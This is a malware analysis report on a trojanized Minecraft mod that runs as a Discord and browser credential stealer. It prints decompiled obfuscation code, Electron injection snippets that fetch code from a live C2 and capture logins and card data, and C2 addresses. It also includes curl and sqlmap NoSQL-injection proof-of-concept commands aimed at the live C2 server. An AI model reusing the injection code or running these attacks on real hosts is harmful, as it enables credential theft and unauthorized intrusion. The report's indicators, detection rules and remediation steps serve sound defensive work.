# Kumoro Utility 3.1.6 — Malware Analysis Report

> **Classification:** Malware-as-a-Service Discord/Browser Credential Stealer  
> **Sample:** `Kumoro Utility 3.1.6.jar` (Minecraft Fabric Mod)  
> **Author alias:** `dev.azad1337` / `t.me/rapidstealerxx`  
> **Analysis date:** 2026-06-04  
> **Analyst:** Destiny Creates  
> **TLP:** WHITE — Free for distribution  

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Sample Metadata](#2-sample-metadata)
3. [Obfuscation Analysis](#3-obfuscation-analysis)
4. [Malware Architecture](#4-malware-architecture)
5. [Class-by-Class Analysis](#5-class-by-class-analysis)
6. [C2 Infrastructure Analysis](#6-c2-infrastructure-analysis)
7. [Discord Electron Injection Script](#7-discord-electron-injection-script)
8. [C2 Vulnerability Assessment](#8-c2-vulnerability-assessment)
9. [Browser Credential Theft](#9-browser-credential-theft)
10. [Indicators of Compromise](#10-indicators-of-compromise)
11. [Remediation Guide](#11-remediation-guide)
12. [Reporting Targets](#12-reporting-targets)
13. [MITRE ATT&CK Mapping](#13-mitre-attck-mapping)

---

## 1. Executive Summary

`Kumoro Utility 3.1.6.jar` is a trojanized Minecraft Fabric utility mod that implements a full-featured **Malware-as-a-Service (MaaS) credential stealer** operated by a threat actor using the alias `rapidstealer` / `azad1337`. The JAR was distributed on Minecraft modding communities as a legitimate utility mod.

Upon execution, the malware:

- Steals Discord account tokens from 8 Discord client variants and 7 browsers
- Injects a persistent JavaScript backdoor into the Discord Electron application
- Intercepts login credentials, 2FA codes, backup codes, and payment card details in real-time
- Exfiltrates browser credentials via an external CDN (`cdn.privatefile.host`)
- Communicates with a C2 server at `46.151.182.157` running as Windows Administrator
- Operates as a rented MaaS platform with 10 confirmed active customers

The C2 infrastructure was found to be **live and actively serving victims** at time of analysis, with a confirmed **MongoDB NoSQL injection vulnerability** in the exfiltration endpoint and multiple unauthenticated information disclosure endpoints.

---

## 2. Sample Metadata

| Field | Value |
|---|---|
| Filename | `Kumoro Utility 3.1.6.jar` |
| File type | Java Archive (ZIP) |
| Declared type | Minecraft Fabric Mod |
| Root package | `dev.azad1337` |
| Mod ID | `kumoro_utility` |
| Author | `dev.azad1337` |
| Version | `3.1.6` |
| Malware version | `1.0.3` (internal, from version endpoint) |
| Java target | 11+ (uses `java.net.http.HttpClient`) |
| Obfuscation | Custom invokedynamic bootstrap + XOR string encryption |
| Secondary payload hash | `79fa0ef13c04d252be3860c9ca8560fe` |

---

## 3. Obfuscation Analysis

### 3.1 Package and Class Name Obfuscation

All classes are placed in packages using Unicode homoglyph characters (Turkish dotless-i `ı`, dotted-I `İ`, Latin `l` vs `I`) to create visually indistinguishable package names:

```
dev.azad1337.IlıİiIılİlIıiİlIiılIıİl   (homoglyph mix)
dev.azad1337.IılİIıilİlIıİliIılİIıi    (different mix)
dev.azad1337.lIılİIıilİlIıİliIılİIı    (yet another mix)
```

Class names follow the pattern `C0000X` where `X` is a single letter, obfuscated by JADX during decompilation.

### 3.2 Invokedynamic Bootstrap Obfuscation

All method calls are routed through a custom invokedynamic bootstrap dispatcher (`C0003v.m40a`). Every call site generates a `MethodHandles.lookup()` + `MethodType` descriptor + a `long` seed parameter, making static analysis extremely difficult.

Bootstrap class binary name: `dev/azad1337/IlıİiIılİlIıiİlIiılIıİl/v` (method `a`)

### 3.3 String Encryption

All string literals are runtime-encrypted using a per-class XOR cipher:

```java
private static String m11a(int i, int i2, int i3) {
    int i5 = ((i ^ i3) ^ MAGIC) & 65535; // index into encrypted array
    if (f5c[i5] == null) {
        char[] charArray = f4b[i5].toCharArray(); // fetch ciphertext
        // XOR decrypt with rotating key derived from first char
        f5c[i5] = new String(charArray).intern();
    }
    return f5c[i5];
}
```

**Decryption parameters recovered:**

| Class | MAGIC constant | Array size |
|---|---|---|
| `DiscordC2Sender` (C0001O) | 19433 | 75 |
| `DiscordTokenValidator` (C0008Z) | 59160 | 31 |
| `DiscordAccountStealer` (C0009j) | (derived) | 275 |
| `EnvironmentEnumerator` (C0010k) | (derived) | 26 |

---

## 4. Malware Architecture

```
Kumoro Utility 3.1.6.jar
│
├── ENTRY POINT
│   └── ModInitializer.java          Fabric mod entry, orchestrates all modules
│
├── OBFUSCATION LAYER
│   ├── InvokedynamicBootstrap.java  All method dispatch routed here
│   └── (string tables embedded in each class static block)
│
├── STEALER MODULES (p001 package)
│   ├── DiscordAccountStealer.java   Primary payload — full Discord account theft
│   ├── DiscordTokenValidator.java   Validates stolen tokens via C2 proxy
│   ├── BrowserCredentialStealer.java Browser password/cookie exfiltration
│   ├── EnvironmentEnumerator.java   System environment variable collection
│   ├── SecondStageDropper.java      Downloads + executes secondary payload
│   └── FeatureRegistry.java         Module registration/management
│
├── C2 COMMUNICATION (p000 package)
│   ├── DiscordC2Sender.java         Discord webhook/bot embed builder + sender
│   ├── ForwarderClient.java         HTTP forwarder to C2 server
│   └── SystemRecon.java             OS, CPU, RAM, IP, hostname collection
│
└── ANTI-TAMPER (p002 package)
    ├── JarIntegrityVerifier.java    Verifies JAR hash against C2 endpoint
    ├── DomainMonitor.java           Monitors C2 domains (sandbox detection)
    ├── VersionChecker.java          Checks version against GitHub raw
    └── IntegrityChecker.java        Kills process if C2 unreachable
```

---

## 5. Class-by-Class Analysis

### 5.1 ModInitializer.java (C0000C)

Fabric `ModInitializer` entry point. Invoked on game launch. Registers all feature modules and starts the stealer pipeline in a background thread to avoid blocking game load.

### 5.2 DiscordAccountStealer.java (C0009j)

**The primary payload.** 275 encrypted strings, largest class in the JAR.

**Targets (DISCORD_CLIENTS array, 8 entries):**

| Client | Path |
|---|---|
| Discord | `%APPDATA%\discord` |
| Discord Canary | `%APPDATA%\discordcanary` |
| Discord PTB | `%APPDATA%\discordptb` |
| Discord Development | `%APPDATA%\discorddevelopment` |
| Lightcord | `%APPDATA%\Lightcord` |
| Vencord | `%APPDATA%\Vencord` |
| Armcord | `%APPDATA%\armcord` |
| Webcord | `%APPDATA%\WebCord` |

**Token extraction methods:**
1. **Plaintext regex** — scans `Local Storage/leveldb` for raw token strings
2. **Encrypted token** — detects `dQw4w9WgXcQ:` prefix (Chrome 80+ encrypted tokens)
3. **AES-256-GCM decryption** (`m84N`) — extracts DPAPI-encrypted master key from `Local State`, decrypts token

**Per-account data collected:**
- Username, discriminator, user ID, email, phone number
- Nitro status (Classic/Boost/Basic)
- Badge flags (12 badge types with emoji mapping)
- Billing methods (credit cards, PayPal)
- Server memberships (admin/owner guilds filtered)
- Friends list (rare-badged friends highlighted)
- IP address via `api.ipify.org`
- Profile banner, avatar decoration

**Persistence (m96I):**

Injects a managed policy into Electron's `managed/` directory:
```
%APPDATA%\discord\[version]\resources\app\managed\policies.json
```

This causes Discord to load `index.js` from the attacker-controlled `resources/app/` directory on every launch, re-downloading the injection script from the C2 if it has been removed.

### 5.3 DiscordTokenValidator.java (C0008Z)

Validates individual tokens via the C2 proxy at `http://46.151.182.157:1337/api/discord`. Contains a `webhookUrl` field populated at runtime from C2 response. Scans browser profile paths for `Local State` and storage files.

**API Base:** `http://46.151.182.157:1337`

### 5.4 BrowserCredentialStealer.java (C0006G)

Targets 7 Chromium and Gecko browsers:

| Browser | Data Path | Process |
|---|---|---|
| Google Chrome | `AppData\Local\Google\Chrome\User Data` | `chrome.exe` |
| Brave | `AppData\Local\BraveSoftware\Brave-Browser\User Data` | `brave.exe` |
| Microsoft Edge | `AppData\Local\Microsoft\Edge\User Data` | `msedge.exe` |
| Opera | `AppData\Roaming\Opera Software\Opera Stable` | `opera.exe` |
| Opera GX | `AppData\Roaming\Opera Software\Opera GX Stable` | `opera.exe` |
| Vivaldi | `AppData\Local\Vivaldi\User Data` | `vivaldi.exe` |
| Firefox | `AppData\Roaming\Mozilla\Firefox\Profiles` | `firefox.exe` |

Exfiltrates stolen browser data via:
- **Upload:** `https://cdn.privatefile.host/api/upload`
- **CDN Key:** `ak_[REDACTED]`
- **Download base:** `https://cdn.privatefile.host/api/cdn/f/`

### 5.5 DiscordC2Sender.java (C0001O)

Builds and sends Discord webhook embeds. Key constants (decrypted):

| Field | Value |
|---|---|
| BOT_NAME | `t.me/rapidstealerxx` |
| USER_AGENT | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36` |
| BOT_AVATAR | `https://cdn.discordapp.com/attachments/1267444884495798283/1436475079927009362/cover_1.png` |
| API_URL (forward) | `http://46.151.182.157:2210/api/forward` |

The Discord **bot token is NOT embedded in the JAR**. It is stored server-side at `46.151.182.157` and injected into each request by the C2 proxy. This is a deliberate MaaS architecture decision to prevent token extraction from the JAR.

### 5.6 SystemRecon.java (C0004z)

Collects: OS name/version, CPU model, total RAM, hostname, local IP address. Executes shell commands via `Runtime.exec()`.

### 5.7 EnvironmentEnumerator.java (C0010k)

Collects all system environment variables via `System.getenv()`. Specifically extracts `APPDATA` for path construction. APPDATA is `null` at static init time and resolved lazily.

### 5.8 SecondStageDropper.java (C0011p)

Downloads and executes a secondary payload:

| Field | Value |
|---|---|
| DOWNLOAD_URL | `https://cdn.privatefile.host/api/cdn/f/79fa0ef13c04d252be3860c9ca8560fe?download=1` |
| TEMP_DIR | `/tmp` (Linux) or `%TEMP%` (Windows) |

Payload hash: `79fa0ef13c04d252be3860c9ca8560fe` (70MB+ binary, unanalyzed)

### 5.9 JarIntegrityVerifier.java (C0017P)

Verifies the JAR's own hash against `http://46.151.182.157:2210/integrity/hash`. If the hash does not match (modified/patched JAR), the process terminates. Requires `x-api-key` header.

### 5.10 DomainMonitor.java (C0019i)

Monitored domains list:
- `46.151.182.157`
- `privatefile.host`

If either domain is unreachable, triggers `TERMINATE` error mode → `Runtime.halt(1)`. This serves as **sandbox detection**: isolated sandboxes blocking outbound traffic cause self-termination.

### 5.11 VersionChecker.java (C0020x)

| Field | Value |
|---|---|
| VERSION_ENDPOINT | `https://raw.githubusercontent.com/azad1337/versions/refs/heads/main/version.txt` |
| CLIENT_VERSION | `1.0.3` |

Fetches current version from attacker-controlled GitHub. If version mismatch, likely forces update or terminates.

### 5.12 ForwarderClient.java (C0002X)

HTTP client wrapper for `http://46.151.182.157:2210/api/forward`. Sends stolen data to C2 for proxying to the buyer's Discord webhook. `API_KEY` field is empty string — authentication is handled by the `key` field in the POST body (the source of the NoSQL injection vulnerability).

---

## 6. C2 Infrastructure Analysis

### 6.1 Network Map

```
46.151.182.157
│
├── :80   Text Copy Tool (Node.js, wildcard catch-all)
│         Every path returns 200 with the "Text Copy Tool" page
│         The URL path IS the content — /copy/{token} displays the token
│         Used in Discord embeds: [Click to Copy!](http://46.151.182.157/copy/{token})
│         Zero server-side storage — pure client-side URL extraction
│
├── :1337 Injection Server (Express.js)
│         GET  /health        200 {"success":true,"message":"API Server is running","timestamp":"..."}
│         GET  /api/discord   200 Full 26KB Discord Electron injection script (PUBLIC, no auth)
│         CORS: Access-Control-Allow-Origin: *
│
└── :2210 Data Forwarder + Integrity (Express.js + MongoDB)
          GET  /health            200 {"status":"ok","users":10,"keys":10}  ← NO AUTH
          POST /api/forward       Receives stolen data, forwards to buyer webhook
          GET  /integrity/hash    400 {"error":"x-api-key header required"}
          OS:  Windows Server (Administrator)
          CWD: C:\Users\Administrator\Desktop\Private - Copy\forwarder\webhook-backend\
```

### 6.2 Server Fingerprint

- **OS:** Windows Server (confirmed via stack trace path separators and drive letter)
- **Runtime:** Node.js + Express.js
- **Database:** MongoDB (confirmed by accepted `$gt`, `$ne`, `$regex` operators)
- **User context:** `Administrator` (full system privileges)
- **Framework:** Express `body-parser` + `raw-body` npm modules
- **Headers:** No security headers on any port (`X-Powered-By: Express` exposed)

### 6.3 MaaS Architecture

The platform operates as a rented stealer service:

1. Customer purchases access from `t.me/rapidstealerxx`
2. Customer receives a build of `Kumoro Utility 3.1.6.jar` with their API key embedded
3. Customer distributes JAR to victims
4. Victim runs JAR → data stolen → POSTed to `46.151.182.157:2210/api/forward` with customer's key
5. C2 looks up customer's webhook URL by key → forwards rich embed to customer's Discord
6. Customer sees victim data in their Discord channel
7. Token copy links use `http://46.151.182.157/copy/{token}` for one-click token theft
8. Electron injection is re-downloaded from `46.151.182.157:1337/api/discord` with customer's webhook substituted for `%WEBHOOK%`

**Active customers at time of analysis:** 10  
**Active API keys:** 10

---

## 7. Discord Electron Injection Script

The full 603-line, 26KB JavaScript payload is served at `http://46.151.182.157:1337/api/discord`. It is injected into Discord's Electron renderer process via the managed policy mechanism.

### 7.1 Persistence Mechanism

```javascript
// Writes a startup hijack to Discord's own resources/app/index.js
// Every Discord launch:
//   1. Checks if index.js < 20KB (uninjected)
//   2. Downloads fresh injection from C2
//   3. Replaces %WEBHOOK% with customer's actual webhook URL
//   4. Writes infected code to index.js
//   5. If C2 unreachable: retries every 10 seconds

https.get(CONFIG.injection_url, (res) => {
    let responseData = '';
    res.on('data', chunk => responseData += chunk);
    res.on('end', () => {
        responseData = responseData.replace(/%WEBHOOK%/g, CONFIG.webhook);
        file.write(responseData);
    });
}).on('error', () => setTimeout(init, 10000));
```

### 7.2 Credential Interception (Chrome DevTools Protocol)

Attaches a CDP debugger to Discord's `BrowserWindow` and intercepts network responses:

| Intercepted Endpoint | Data Extracted |
|---|---|
| `POST /auth/login` | Email, password, token |
| `POST /auth/register` | Email, password, token |
| `POST /mfa/totp` | Token (post-2FA) |
| `POST /mfa/codes-verification` | All unused 2FA backup codes |
| `PATCH /users/@me` | New password, old password, new email |

### 7.3 Payment Interception

```javascript
session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
    if (details.url.endsWith('tokens')) { // Stripe
        // Captures: card number, CVC, exp_month, exp_year
        await CreditCardAdded(item['card[number]'], item['card[cvc]'],
                              item['card[exp_month]'], item['card[exp_year]'], token);
    } else if (details.url.endsWith('paypal_accounts')) { // Braintree/PayPal
        await PaypalAdded(token);
    }
});
```

**Intercepted payment processors:**
- Stripe: `https://api.stripe.com/v*/tokens`
- Braintree/PayPal: `https://api.braintreegateway.com/merchants/[MERCHANT_ID_REDACTED]/client_api/v*/payment_methods/paypal_accounts`

### 7.4 Remote Auth Blocking

```javascript
// Cancels all QR code login attempts — prevents victim from checking active sessions
session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith('wss://remote-auth-gateway') ||
        details.url.endsWith('auth/sessions')) {
        return callback({ cancel: true }); // SILENTLY BLOCKED
    }
    callback({});
});
```

### 7.5 First-Run Exfiltration + Forced Re-Login

On first injection:
1. Sends `"{username} just got injected!"` to customer's webhook with full account data
2. Calls `clearAllUserData()` → clears Discord localStorage + forces page reload
3. Victim is prompted to log in again → login credentials captured by CDP interceptor

---

## 8. C2 Vulnerability Assessment

### CVE-Equivalent Finding 1: MongoDB NoSQL Injection (CRITICAL)

**Endpoint:** `POST http://46.151.182.157:2210/api/forward`  
**Parameter:** `key` (JSON body field)  
**Type:** MongoDB operator injection  
**Authentication required:** None  

**Proof of Concept:**

```bash
# Normal invalid key — returns:
curl -X POST http://46.151.182.157:2210/api/forward \
  -H 'Content-Type: application/json' \
  -d '{"key":"invalid"}'
# {"error":"Key not found"}

# MongoDB $gt operator — returns DIFFERENT error (query executed, document found):
curl -X POST http://46.151.182.157:2210/api/forward \
  -H 'Content-Type: application/json' \
  -d '{"key":{"$gt":""}}'
# {"error":"Webhook URL not found"}  <-- query bypassed, matched a document

# $ne operator — same bypass:
curl -X POST http://46.151.182.157:2210/api/forward \
  -H 'Content-Type: application/json' \
  -d '{"key":{"$ne":null}}'
# {"error":"Webhook URL not found"}

# $regex — confirms MongoDB, allows blind enumeration:
curl -X POST http://46.151.182.157:2210/api/forward \
  -H 'Content-Type: application/json' \
  -d '{"key":{"$regex":"^ak_"}}'
# {"error":"Webhook URL not found"}  <-- confirms ak_ prefix keys exist
```

**Error Oracle:**
- `{"error":"Key not found"}` = no document matched
- `{"error":"Webhook URL not found"}` = document matched but no webhookUrl field
- `{"success":true}` = full match with webhook (would trigger forward)

**Impact:** Blind enumeration of all MongoDB documents, potential extraction of all 10 customer webhook URLs, complete authentication bypass.

**Automated testing command:**
```bash
# Using the provided request file
sqlmap -r c2_sqli_request.txt --batch --dbs  # for SQL surface completeness

# Correct tool for NoSQL:
python3 nosqli_exploit.py  # custom blind injection extractor
```

### CVE-Equivalent Finding 2: Unauthenticated Information Disclosure (HIGH)

**Endpoint:** `GET http://46.151.182.157:2210/health`  
**Authentication required:** None  

```json
{"status": "ok", "users": 10, "keys": 10}
```

Exposes active customer/key count with zero authentication.

**Endpoint:** `GET http://46.151.182.157:1337/health`  
```json
{"success": true, "message": "API Server is running", "timestamp": "2026-06-04T22:33:24.288Z"}
```

### CVE-Equivalent Finding 3: Full Stack Trace Disclosure (HIGH)

Malformed JSON body triggers unhandled exception with full stack trace:

```
SyntaxError: Unexpected non-whitespace character after JSON at position 22
    at JSON.parse (<anonymous>)
    at parse (C:\Users\Administrator\Desktop\Private - Copy\forwarder\
              webhook-backend\node_modules\body-parser\lib\types\json.js:72:19)
```

Discloses: OS = Windows, user = Administrator, full absolute path to application.

### CVE-Equivalent Finding 4: Injection Script Served Without Authentication (HIGH)

`GET http://46.151.182.157:1337/api/discord` returns the full 26KB injection script with zero authentication, enabling any actor to:
- Copy and deploy the injection script independently
- Study the malware's full operation
- Modify and redistribute

### CVE-Equivalent Finding 5: CORS Wildcard (MEDIUM)

`Access-Control-Allow-Origin: *` on port 1337 allows any website to make cross-origin requests to the injection server.

### CVE-Equivalent Finding 6: Missing Security Headers (MEDIUM)

No security headers present on any port:
- No `X-Content-Type-Options`
- No `X-Frame-Options`  
- No `Content-Security-Policy`
- No `Strict-Transport-Security`
- No rate limiting
- `X-Powered-By: Express` exposed

### CVE-Equivalent Finding 7: SMB Ports Filtered Not Closed (INFO)

Ports 445, 139, 135, 3389 are **filtered** (firewall rule) on the Windows server. CVE-2020-0796 (SMBGhost) is not exploitable remotely due to filtering, but the attack surface exists at the host level.

---

## 9. Browser Credential Theft

Chromium-based browsers store passwords encrypted with AES-256-GCM using a master key protected by DPAPI (Windows Data Protection API). The malware extracts these via:

1. Reading `Local State` file → extracting `os_crypt.encrypted_key` (base64)
2. Base64 decoding + stripping `DPAPI` prefix
3. Calling `CryptUnprotectData` (Windows API) to decrypt master key
4. Using master key to decrypt individual passwords via AES-256-GCM
5. Reading `Login Data` SQLite database for encrypted credentials

Firefox uses NSS (Network Security Services) with `key4.db` and `logins.json`, requiring a different extraction path.

All collected data is ZIPped and uploaded to `cdn.privatefile.host` with the CDN API key.

---

## 10. Indicators of Compromise

### Network IOCs

| Indicator | Type | Description |
|---|---|---|
| `46.151.182.157` | IP | Primary C2 server |
| `46.151.182.157:80` | URL | Token copy-link service |
| `46.151.182.157:1337` | URL | Injection script server |
| `46.151.182.157:2210` | URL | Exfiltration receiver / integrity check |
| `cdn.privatefile.host` | Domain | Credential exfiltration CDN |
| `t.me/rapidstealerxx` | URL | Attacker Telegram |
| `github.com/azad1337` | URL | Attacker version control |
| `raw.githubusercontent.com/azad1337/versions/refs/heads/main/version.txt` | URL | Version check endpoint |
| `api.ipify.org` | URL | Victim IP lookup |

### File IOCs

| Indicator | Type | Description |
|---|---|---|
| `Kumoro Utility 3.1.6.jar` | Filename | Primary malware JAR |
| `79fa0ef13c04d252be3860c9ca8560fe` | MD5 | Secondary payload hash |
| `ak_[REDACTED]` | String | CDN API key |
| `%APPDATA%\discord\*\resources\app\index.js` | File path | Electron injection target |
| `%APPDATA%\discord\*\resources\app\package.json` | File path | Electron hijack package |
| `%APPDATA%\discord\*\managed\policies.json` | File path | Managed policy persistence |

### Registry / Process IOCs

| Indicator | Type | Description |
|---|---|---|
| `discord_desktop_core` | Module | Targeted Discord core module |
| `dQw4w9WgXcQ:` | String | Encrypted Discord token prefix |
| `t.me/rapidstealer` | String | Embedded in webhook username |

### Discord Server IOCs (Custom Emoji IDs)

Custom emoji IDs reveal the attacker's Discord server:

| Emoji | ID |
|---|---|
| `:staff:` | `1362105228719034679` |
| `:pig:` | `1362105166811103515` |
| `:brilliance:` | `1362105019066748968` |
| `:partner:` | `1362105185094336622` |
| `:activedev:` | `1362104965065212074` |
| `:boost4:` | `1362104873600024857` |
| `:boost5:` | `1362104892226928812` |

Server IDs can be extracted from these emoji IDs to identify the attacker's Discord server.

---

## 11. Remediation Guide

### Immediate Response (For Victims)

```
1.  KILL Discord immediately (Task Manager → End Task)

2.  DELETE the injection files:
    %APPDATA%\discord\[version]\resources\app\index.js
    %APPDATA%\discord\[version]\resources\app\package.json
    Repeat for: discordcanary, discordptb, vencord, armcord, webcord, lightcord

3.  DELETE managed policies:
    %APPDATA%\discord\[version]\managed\policies.json

4.  REINSTALL Discord from official installer (discord.com)
    DO NOT just update — reinstall completely

5.  REVOKE Discord token:
    Settings → Privacy & Safety → Authorized Apps → Remove all
    Settings → Devices → Log Out All Known Devices
    Change password immediately

6.  RESET 2FA:
    Disable and re-enable 2FA
    Generate new backup codes (old ones are compromised)

7.  AUDIT billing:
    Remove all payment methods and re-add
    Check for unauthorized charges
    Contact bank if card was used on Discord recently

8.  CHANGE PASSWORDS for all browser-saved credentials
    The browser credential stealer may have exfiltrated all saved passwords

9.  ENABLE antivirus scan on full system
    Secondary payload (79fa0ef...) may have been dropped to %TEMP%

10. CHECK for secondary payload:
    dir %TEMP% /od  (look for large unknown executables)
    dir C:\Users\%USERNAME%\AppData\Local\Temp
```

### Detection Rules

**Yara Rule:**
```yara
rule Kumoro_Utility_Stealer {
    meta:
        description = "Detects Kumoro Utility 3.1.6 Discord stealer"
        author = "Destiny Creates"
        date = "2026-06-04"
        hash = "Kumoro Utility 3.1.6.jar"
    strings:
        $c2_ip   = "46.151.182.157" ascii
        $cdn     = "cdn.privatefile.host" ascii
        $tg      = "t.me/rapidstealer" ascii
        $api_key = "ak_[REDACTED]" ascii
        $pkg     = "dev/azad1337" ascii
        $payload = "79fa0ef13c04d252be3860c9ca8560fe" ascii
    condition:
        uint32(0) == 0x04034b50 and  // ZIP/JAR magic
        2 of ($c2_ip, $cdn, $tg, $api_key, $pkg)
}
```

**Network Detection (Suricata/Snort):**
```
alert http $HOME_NET any -> 46.151.182.157 any (
    msg:"Kumoro Stealer C2 Communication";
    flow:established,to_server;
    sid:9000001; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (
    msg:"Kumoro Stealer CDN Upload";
    http.header; content:"ak_[REDACTED]";
    sid:9000002; rev:1;)

alert dns $HOME_NET any -> any 53 (
    msg:"Kumoro Stealer CDN Domain";
    dns.query; content:"privatefile.host";
    sid:9000003; rev:1;)
```

**Electron Injection Detection (PowerShell):**
```powershell
# Check for Discord Electron injection across all Discord variants
$variants = @('discord','discordcanary','discordptb','discorddevelopment','vencord','armcord','webcord','lightcord')
foreach ($v in $variants) {
    $path = "$env:APPDATA\$v"
    if (Test-Path $path) {
        Get-ChildItem "$path\*\resources\app\index.js" -ErrorAction SilentlyContinue | ForEach-Object {
            $size = (Get-Item $_).Length
            if ($size -gt 20000) {
                Write-Warning "INJECTED: $_ ($size bytes)"
                Select-String -Path $_ -Pattern '46\.151\.182\.157|rapidstealer|privatefile' -ErrorAction SilentlyContinue
            }
        }
    }
}
```

---

## 12. Reporting Targets

| Target | Contact | Evidence to Include |
|---|---|---|
| Hosting provider for `46.151.182.157` | Look up ASN/abuse contact via whois | C2 IP, malware sample, injection script |
| `privatefile.host` | abuse@privatefile.host or registrar | CDN key, upload endpoint, stolen data storage |
| Telegram | @SpamBot or report via app | `t.me/rapidstealerxx` profile |
| GitHub | github.com/contact/report-abuse | `azad1337/versions` repo, version.txt |
| Discord Trust & Safety | dis.gd/report | C2 IP, emoji server IDs, webhook abuse |
| CurseForge / Modrinth | Platform abuse forms | JAR file, malware evidence |

---

## 13. MITRE ATT&CK Mapping

| Technique | ID | Implementation |
|---|---|---|
| Supply Chain Compromise | T1195 | Trojanized Minecraft mod |
| Masquerading | T1036 | JAR presented as legitimate utility mod |
| Obfuscated Files or Information | T1027 | Invokedynamic bootstrap + XOR string encryption |
| Software Packing | T1027.002 | Custom string encryption per class |
| Credentials from Password Stores: Web Browsers | T1555.003 | AES-256-GCM Chrome credential decryption |
| Steal Web Session Cookie | T1539 | Discord token extraction from leveldb/localStorage |
| Input Capture: Credential API Hooking | T1056.004 | CDP debugger intercepts login POST responses |
| Financial Theft | T1657 | Stripe/Braintree payment data interception |
| Exfiltration Over C2 Channel | T1041 | Data exfil via `46.151.182.157:2210/api/forward` |
| Exfiltration to Cloud Storage | T1567.002 | Browser data uploaded to `cdn.privatefile.host` |
| Boot or Logon Autostart: Registry Run Keys | T1547 | Electron index.js hijack persists across launches |
| Modify Authentication Process | T1556 | Remote auth (QR login) silently blocked |
| System Information Discovery | T1082 | OS, CPU, RAM, hostname collection |
| Network Service Discovery | T1046 | Domain monitoring for sandbox detection |
| Virtualization/Sandbox Evasion: System Checks | T1497.001 | Kills self if C2 unreachable (sandbox detection) |
| Ingress Tool Transfer | T1105 | Secondary payload downloaded from CDN |
| Command and Scripting Interpreter: JavaScript | T1059.007 | Electron JS injection for runtime credential theft |
| Man-in-the-Browser | T1185 | CDP-based interception of Discord network traffic |

---

## Appendix: SQLMap Request File

For automated testing of the `/api/forward` endpoint (note: backend is MongoDB — use NoSQLMap for accurate results):

```
POST /api/forward HTTP/1.1
Host: 46.151.182.157:2210
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Connection: close

{"key":"*","token":"test","data":{}}
```

**Base64 encoded:**
```
[BASE64_REDACTED]
```

**SQLMap command:**
```bash
sqlmap -r c2_sqli_request.txt \
  --level=5 --risk=3 \
  --technique=B \
  --batch
```

**NoSQLMap command (correct tool):**
```bash
python3 nosqli_exploit.py
```

---

*Report generated by static reverse engineering of decompiled JAR source code and live C2 infrastructure analysis. All testing performed in isolated network namespace. No victim data was accessed or retained.*
